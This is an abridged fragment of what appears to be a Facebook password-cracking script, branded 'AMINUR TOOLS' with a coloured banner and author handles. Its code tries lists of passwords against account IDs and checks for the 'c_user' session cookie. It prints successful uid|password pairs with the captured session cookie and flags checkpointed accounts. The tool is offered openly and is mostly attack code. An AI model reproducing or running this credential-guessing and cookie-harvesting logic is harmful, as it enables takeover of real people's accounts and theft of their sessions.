...
╠═╣║║║║║║║║ ║╠╦╝
╩ ╩╩ ╩╩╝╚╝╚═╝╩╚═
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO AMINUR TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m FREE
\033[1;32m[-] AUTHOR    :\033[1;32m ONLY ME
\033[1;32m[-] GITHUB    :\033[1;32m AMINUR69 
\033[1;32m[-] FACEBOOK  :\033[1;32m MD AMINUR RAHMAN 
\033[1;92m══════════════════════════════════════════
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AMINUR-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[AMINUR-CP❌] {uid}|{ps}")
